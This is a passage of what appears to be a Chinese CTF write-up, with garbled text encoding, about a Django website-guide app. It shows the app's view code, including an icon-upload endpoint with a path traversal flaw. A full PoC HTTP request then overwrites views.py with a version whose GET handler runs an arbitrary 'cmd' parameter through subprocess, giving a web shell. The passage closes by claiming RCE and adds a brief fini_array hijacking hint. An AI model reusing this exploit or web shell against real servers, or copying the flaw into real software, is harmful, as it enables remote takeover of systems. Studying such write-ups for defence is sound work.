class="keyword">if</span> user:</span><br><span class="line">            payload = jwt_payload_handler(user)</span><br><span class="line">            payload[<span class="string">&#x27;is_superuser&#x27;</span>] = user.is_superuser</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(&#123;<span class="string">&#x27;token&#x27;</span>: jwt_encode_handler(payload)&#125;, status=status.HTTP_200_OK)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(<span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&#x27;</span>, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AllWebsiteDataViewSet</span>(<span class="params">ReadOnlyModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    é¦–é¡µåˆ†ç»„åµŒå¥—ç½‘å€æ•°æ®ï¼šæŸ¥è¯¢ /api/alldata/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    queryset = models.WebSiteGroup.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = AllWebsiteDataSerializers</span><br><span class="line">    <span class="comment"># authentication_classes = (JSONWebTokenAuthentication,)</span></span><br><span class="line">    <span class="comment"># permission_classes = [IsAuthenticated]</span></span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;websites__title&#x27;</span>,<span class="string">&#x27;websites__description&#x27;</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebsiteDataViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç½‘å€ç®¡ç†ï¼šå¢åˆ æ”¹æŸ¥ /api/website/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    queryset = models.WebSite.objects.<span class="built_in">all</span>()</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;description&#x27;</span>)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ ¹æ®è¯·æ±‚é€‰æ‹©åºåˆ—åŒ–å™¨&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_serializer_class</span>(<span class="params">self</span>):</span></span><br><span class="line">        serializer_class = self.serializer_class</span><br><span class="line">        <span class="keyword">if</span> self.request.method <span class="keyword">in</span> (<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;DELETE&#x27;</span>):</span><br><span class="line">            serializer_class = UpdateWebsiteDataSerializers</span><br><span class="line">        <span class="keyword">if</span> self.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            serializer_class = GetWebsiteDataSerializers</span><br><span class="line">        <span class="keyword">return</span> serializer_class</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;é‡å†™postæ¥å£ï¼Œæ”¯æŒæ‰¹é‡åˆ›å»º&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> serializer.is_valid():</span><br><span class="line">                <span class="keyword">return</span> CustomResponse(</span><br><span class="line">                    status=status.HTTP_400_BAD_REQUEST,</span><br><span class="line">                    msg=<span class="string">&#x27;formè¡¨å•æ ¡éªŒä¸é€šè¿‡&#x27;</span>,</span><br><span class="line">                    data=&#123;<span class="string">&#x27;data&#x27;</span>: serializer.data, <span class="string">&#x27;error&#x27;</span>: serializer.errors&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            serializer.is_valid()</span><br><span class="line">            self.perform_create(serializer)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CustomResponse(</span><br><span class="line">            status=status.HTTP_201_CREATED,</span><br><span class="line">            msg=<span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;è‡ªå®šä¹‰æ–¹æ³•ï¼Œå®ç°æ‰¹é‡åˆ é™¤&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @action(<span class="params">methods=[<span class="string">&#x27;delete&#x27;</span>], detail=<span class="literal">False</span>, permission_classes=[IsAuthenticated], url_path=<span class="string">&#x27;delete&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multiple_delete</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        selectids = request.query_params.get(<span class="string">&#x27;selectId&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> selectids:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(status=status.HTTP_404_NOT_FOUND)</span><br><span class="line">        selectid = selectids.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        selectid = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> selectid <span class="keyword">if</span> x.split()]</span><br><span class="line">        models.WebSite.objects.<span class="built_in">filter</span>(id__in=selectid).delete()</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(status=status.HTTP_204_NO_CONTENT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebsiteGroupViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åˆ†ç»„ç®¡ç†ï¼šå¢åˆ æ”¹æŸ¥ /api/group/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    queryset = models.WebSiteGroup.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = WebsiteGroupSerializers</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;name&#x27;</span>,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfoViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    queryset = models.UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = UserInfoSerializer</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;alias&#x27;</span>, <span class="string">&#x27;is_active&#x27;</span>,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @action(<span class="params">methods=[<span class="string">&#x27;post&#x27;</span>], detail=<span class="literal">True</span>, permission_classes=[IsAuthenticated],</span></span></span><br><span class="line"><span class="meta"><span class="params">            url_path=<span class="string">&#x27;change-passwd&#x27;</span>, url_name=<span class="string">&#x27;change-passwd&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change_password</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = kwargs.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        password1 = request.data[<span class="string">&#x27;password1&#x27;</span>]</span><br><span class="line">        password2 = request.data[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">        user = models.UserInfo.objects.get(<span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">if</span> password1 == password2:</span><br><span class="line">            user.set_password(password2)</span><br><span class="line">            user.save()</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(msg=<span class="string">&quot;å¯†ç ä¿®æ”¹æˆåŠŸ&quot;</span>, status=status.HTTP_200_OK)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(msg=<span class="string">&quot;å¯†ç ä¸¤æ¬¡è¾“å…¥ä¸ä¸€è‡´!&quot;</span>, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IconViewSet</span>(<span class="params">View</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = request.GET.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span class="string">&quot;default.png&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;å›¾ç‰‡åç§°ä¸èƒ½ä¸ºdefault.pngï¼Œè¯·ä¿®æ”¹&#x27;</span>&#125;)</span><br><span class="line">        file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)</span><br><span class="line">        ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">if</span> ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;æ›¿æ¢æˆåŠŸ&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;æ›¿æ¢å¤±è´¥&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>POCå¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/icon/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk1MzU1MDE5LCJlbWFpbCI6bnVsbCwiaXNfc3VwZXJ1c2VyIjp0cnVlfQ.iVvuv2UfITz7xK_qoURSBVgucNUzD4vxPsFMGqlCUaA</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------19981713787484837123326027504</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7883</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8000/admin/website</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>username-localhost-8888=&quot;2|1:0|10:1692618286|23:username-localhost-8888|44:MGJmZTUxMDJiOTBhNDNjYjg3YmZlMDQ2ZDBlMzE5ZDI=|02f839e6bab8d5f992db23c9063e1f2bf3bc9103f6e4c0b8517741819d4fa610&quot;; _xsrf=2|e2b7d629|893df11fb1e9af3dbebe64d7830b1b15|1692618286</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"></span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">../../views.py</span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;poc.py&quot;</span><br><span class="line">Content-Type: text/x-python-script</span><br><span class="line"></span><br><span class="line">from django.shortcuts import render</span><br><span class="line">import subprocess</span><br><span class="line"># Create your views here.</span><br><span class="line">from WebsiteGuide.basic import CustomResponse, CustomPagination</span><br><span class="line">from websiteapp import models</span><br><span class="line">from websiteapp.serializers.websites_serializer import \</span><br><span class="line">    AllWebsiteDataSerializers, UpdateWebsiteDataSerializers, GetWebsiteDataSerializers</span><br><span class="line">from websiteapp.serializers.group_serializer import WebsiteGroupSerializers</span><br><span class="line">from websiteapp.serializers.user_serializer import UserInfoSerializer</span><br><span class="line">from rest_framework import status</span><br><span class="line">from rest_framework.views import APIView</span><br><span class="line">from rest_framework.viewsets import ModelViewSet, ReadOnlyModelViewSet</span><br><span class="line">from rest_framework.filters import SearchFilter</span><br><span class="line">from rest_framework.decorators import action</span><br><span class="line">from django.contrib.auth import authenticate</span><br><span class="line">from rest_framework.permissions import IsAuthenticated</span><br><span class="line">from rest_framework_jwt.settings import api_settings</span><br><span class="line">from rest_framework_jwt.authentication import JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">from django.conf import settings</span><br><span class="line">from django.http import HttpResponse, JsonResponse</span><br><span class="line">from django.views import View</span><br><span class="line"></span><br><span class="line">jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserAuthView(APIView):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ç”¨æˆ·è®¤è¯è·å–token</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def post(self, request, *args, **kwargs):</span><br><span class="line">        username = request.data.get(&#x27;username&#x27;)</span><br><span class="line">        password = request.data.get(&#x27;password&#x27;)</span><br><span class="line">        user = authenticate(username=username, password=password)</span><br><span class="line">        if user:</span><br><span class="line">            payload = jwt_payload_handler(user)</span><br><span class="line">            payload[&#x27;is_superuser&#x27;] = user.is_superuser</span><br><span class="line">            return CustomResponse(&#123;&#x27;token&#x27;: jwt_encode_handler(payload)&#125;, status=status.HTTP_200_OK)</span><br><span class="line">        else:</span><br><span class="line">            return CustomResponse(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&#x27;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AllWebsiteDataViewSet(ReadOnlyModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    é¦–é¡µåˆ†ç»„åµŒå¥—ç½‘å€æ•°æ®ï¼šæŸ¥è¯¢ /api/alldata/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    queryset = models.WebSiteGroup.objects.all()</span><br><span class="line">    serializer_class = AllWebsiteDataSerializers</span><br><span class="line">    # authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    # permission_classes = [IsAuthenticated]</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;websites__title&#x27;,&#x27;websites__description&#x27;)</span><br><span class="line">    &#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class WebsiteDataViewSet(ModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ç½‘å€ç®¡ç†ï¼šå¢åˆ æ”¹æŸ¥ /api/website/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    queryset = models.WebSite.objects.all()</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;title&#x27;, &#x27;path&#x27;, &#x27;description&#x27;)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    &#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;æ ¹æ®è¯·æ±‚é€‰æ‹©åºåˆ—åŒ–å™¨&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def get_serializer_class(self):</span><br><span class="line">        serializer_class = self.serializer_class</span><br><span class="line">        if self.request.method in (&#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;PATCH&#x27;, &#x27;DELETE&#x27;):</span><br><span class="line">            serializer_class = UpdateWebsiteDataSerializers</span><br><span class="line">        if self.request.method == &#x27;GET&#x27;:</span><br><span class="line">            serializer_class = GetWebsiteDataSerializers</span><br><span class="line">        return serializer_class</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;é‡å†™postæ¥å£ï¼Œæ”¯æŒæ‰¹é‡åˆ›å»º&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def create(self, request, *args, **kwargs):</span><br><span class="line"></span><br><span class="line">        for data in request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            if not serializer.is_valid():</span><br><span class="line">                return CustomResponse(</span><br><span class="line">                    status=status.HTTP_400_BAD_REQUEST,</span><br><span class="line">                    msg=&#x27;formè¡¨å•æ ¡éªŒä¸é€šè¿‡&#x27;,</span><br><span class="line">                    data=&#123;&#x27;data&#x27;: serializer.data, &#x27;error&#x27;: serializer.errors&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        for data in request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            serializer.is_valid()</span><br><span class="line">            self.perform_create(serializer)</span><br><span class="line"></span><br><span class="line">        return CustomResponse(</span><br><span class="line">            status=status.HTTP_201_CREATED,</span><br><span class="line">            msg=&#x27;æ·»åŠ æˆåŠŸ&#x27;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;è‡ªå®šä¹‰æ–¹æ³•ï¼Œå®ç°æ‰¹é‡åˆ é™¤&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    @action(methods=[&#x27;delete&#x27;], detail=False, permission_classes=[IsAuthenticated], url_path=&#x27;delete&#x27;)</span><br><span class="line">    def multiple_delete(self, request, *args, **kwargs):</span><br><span class="line">        selectids = request.query_params.get(&#x27;selectId&#x27;, None)</span><br><span class="line">        if not selectids:</span><br><span class="line">            return CustomResponse(status=status.HTTP_404_NOT_FOUND)</span><br><span class="line">        selectid = selectids.split(&#x27;,&#x27;)</span><br><span class="line">        selectid = [int(x) for x in selectid if x.split()]</span><br><span class="line">        models.WebSite.objects.filter(id__in=selectid).delete()</span><br><span class="line">        return CustomResponse(status=status.HTTP_204_NO_CONTENT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class WebsiteGroupViewSet(ModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    åˆ†ç»„ç®¡ç†ï¼šå¢åˆ æ”¹æŸ¥ /api/group/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    queryset = models.WebSiteGroup.objects.all()</span><br><span class="line">    serializer_class = WebsiteGroupSerializers</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;name&#x27;,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;é»˜è®¤å‚æ•°pkä¿®æ”¹ä¸ºid&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfoViewSet(ModelViewSet):</span><br><span class="line">    queryset = models.UserInfo.objects.all()</span><br><span class="line">    serializer_class = UserInfoSerializer</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;username&#x27;, &#x27;alias&#x27;, &#x27;is_active&#x27;,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">    @action(methods=[&#x27;post&#x27;], detail=True, permission_classes=[IsAuthenticated],</span><br><span class="line">            url_path=&#x27;change-passwd&#x27;, url_name=&#x27;change-passwd&#x27;)</span><br><span class="line">    def change_password(self, request, *args, **kwargs):</span><br><span class="line">        id = kwargs.get(&#x27;id&#x27;)</span><br><span class="line">        password1 = request.data[&#x27;password1&#x27;]</span><br><span class="line">        password2 = request.data[&#x27;password2&#x27;]</span><br><span class="line">        user = models.UserInfo.objects.get(id=id)</span><br><span class="line">        if password1 == password2:</span><br><span class="line">            user.set_password(password2)</span><br><span class="line">            user.save()</span><br><span class="line">            return CustomResponse(msg=&quot;å¯†ç ä¿®æ”¹æˆåŠŸ&quot;, status=status.HTTP_200_OK)</span><br><span class="line">        else:</span><br><span class="line">            return CustomResponse(msg=&quot;å¯†ç ä¸¤æ¬¡è¾“å…¥ä¸ä¸€è‡´!&quot;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class IconViewSet(View):</span><br><span class="line"></span><br><span class="line">    def get(self, request, *args, **kwargs):</span><br><span class="line">        cmd = request.GET.get(&#x27;cmd&#x27;)</span><br><span class="line">        result = subprocess.Popen(cmd, stdout=-1).communicate()[0]</span><br><span class="line">        return HttpResponse(result)</span><br><span class="line"></span><br><span class="line">    def post(self, request):</span><br><span class="line">        id = request.POST.get(&#x27;id&#x27;)</span><br><span class="line">        name = request.POST.get(&#x27;name&#x27;)</span><br><span class="line">        if str(name) == &quot;default.png&quot;:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: 500, &quot;msg&quot;: &#x27;å›¾ç‰‡åç§°ä¸èƒ½ä¸ºdefault.pngï¼Œè¯·ä¿®æ”¹&#x27;&#125;)</span><br><span class="line">        file = request.FILES.get(&#x27;file&#x27;)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, &#x27;icon&#x27;, name)</span><br><span class="line">        ins = models.WebSite.objects.filter(id=id).first()</span><br><span class="line">        if ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            try:</span><br><span class="line">                with open(save_path, &#x27;wb&#x27;) as f:</span><br><span class="line">                    for chunk in file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                return JsonResponse(&#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;æ›¿æ¢æˆåŠŸ&quot;, &quot;detail&quot;: &#x27;&#x27;&#125;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return JsonResponse(&#123;&quot;code&quot;: 500, &quot;msg&quot;: &quot;æ›¿æ¢å¤±è´¥&quot;, &quot;detail&quot;: e&#125;)</span><br><span class="line">        else:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: 404&#125;)</span><br><span class="line"></span><br><span class="line">-----------------------------19981713787484837123326027504--</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆå¯ä»¥å®ç°RCE</p>
<p><img src="https://s2.loli.net/2023/09/17/RZLbqgei8VcEvpd.png" alt=""></p>
<h2 id="äººå·¥æ™ºéšœ"><a href="#äººå·¥æ™ºéšœ" class="headerlink" title="äººå·¥æ™ºéšœ"></a>äººå·¥æ™ºéšœ</h2><p>æ²¡æ‰“ï¼Œä¸è¿‡å­¦åˆ°äº†ä¸€ç‚¹ï¼Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ— æº¢å‡ºï¼Œå¯ä»¥åŠ«æŒfini_arrayå‡½æ•°æ¥æ§åˆ¶æ‰§è¡Œæµ</p>
